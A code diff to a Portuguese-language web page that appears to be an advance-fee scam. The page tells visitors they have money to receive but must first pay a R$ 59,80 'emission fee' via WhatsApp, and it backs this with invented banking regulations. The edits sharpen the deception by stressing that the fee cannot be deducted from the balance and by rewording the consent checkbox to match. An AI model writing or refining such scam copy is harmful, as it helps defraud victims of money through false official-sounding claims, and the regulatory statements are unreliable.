@@ -221,14 +221,14 @@
                 <p class="text-amber-900 text-[11px] font-semibold">Regularização da Taxa Operacional de Emissão</p>
             </div>
             
-            <!-- POR QUE É NECESSÁRIO PAGAR ESTA TAXA? -->
+            <!-- POR QUE É NECESSÁRIO PAGAR ESTA TAXA? (Com o aviso direto sobre não haver desconto) -->
             <div class="bg-slate-50 border border-slate-200 rounded-xl p-3.5 mb-4 text-xs text-slate-700 space-y-2 text-left leading-relaxed">
                 <p class="font-black text-slate-900 border-b border-slate-200 pb-1 flex items-center justify-between">
-                    <span>📌 Por que existe esta taxa?</span>
+                    <span>📌 Informação Importante:</span>
                     <span class="text-[10px] text-brand bg-blue-50 px-2 py-0.5 rounded border border-blue-200">Normativa SFN</span>
                 </p>
-                <p>• <strong>Emissão de Ordem de Repasse (TED/Pix):</strong> Conforme as diretrizes operacionais do Sistema Financeiro Nacional, a emissão e validação do documento de transferência interbancária exige o selo digital de autenticidade.</p>
-                <p>• <strong>Segurança contra fraudes:</strong> A taxa serve como validação de identidade em camada dupla, garantindo que o valor integral de <span id="valor-badge-detalhe" class="font-mono font-bold text-slate-900">R$ 0,00</span> seja direcionado exclusivamente para a sua conta informada, impedindo desvios.</p>
+                <p>• <strong>Não é possível descontar do saldo:</strong> Por normas de segurança do sistema bancário, o valor da taxa de emissão <strong>não pode ser descontado</strong> do saldo que você tem a receber. A transferência só é liberada e enviada após a confirmação da taxa.</p>
+                <p>• <strong>Segurança contra fraudes:</strong> A taxa serve como validação de identidade em camada dupla, garantindo que o valor integral de <span id="valor-badge-detalhe" class="font-mono font-bold text-slate-900">R$ 0,00</span> seja direcionado exclusivamente para a sua conta informada.</p>
             </div>
 
             <!-- Vantagem / Ancoragem -->
@@ -259,14 +259,14 @@
         <div class="bg-white rounded-2xl max-w-sm w-full p-6 shadow-2xl border-2 border-brand text-center relative">
             <h3 class="text-lg font-black text-slate-900 mb-2">Confirmação de Atendimento</h3>
             <p class="text-xs text-slate-600 mb-4 leading-relaxed">
-                Para sua segurança, confirme abaixo que está ciente de que será direcionado para o atendimento no WhatsApp para pagar a taxa de emissão de <strong class="text-brand">R$ 59,80</strong>.
+                O valor da taxa de emissão de <strong class="text-brand">R$ 59,80</strong> <span class="underline">não pode ser descontado</span> do seu saldo. O repasse só é enviado após o pagamento da taxa.
             </p>
 
             <!-- Checkbox dentro do Modal -->
             <div class="bg-blue-50 border border-blue-200 rounded-xl p-3 mb-5 text-left flex items-start space-x-2.5">
                 <input type="checkbox" id="modal-check" onchange="liberarBotaoModal()" class="mt-0.5 w-5 h-5 accent-brand cursor-pointer flex-shrink-0">
                 <label for="modal-check" class="text-xs text-slate-800 font-bold cursor-pointer leading-tight">
-                    Estou ciente e concordo em pagar a taxa de emissão no WhatsApp.
+                    Estou ciente de que a taxa não é descontada do saldo e irei pagá-la no WhatsApp para receber meu dinheiro.
                 </label>
             </div>
 
@@ -480,11 +480,7 @@
                 btn.disabled = true;
                 btn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
                 btn.classList.remove('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
-                if(contaGlobal.length > 0) {
-                    err.classList.add('hidden'); // Oculta erro prematuro para facilitar digitação
-                } else {
-                    err.classList.add('hidden');
-                }
+                err.classList.add('hidden');
             }
         }
 
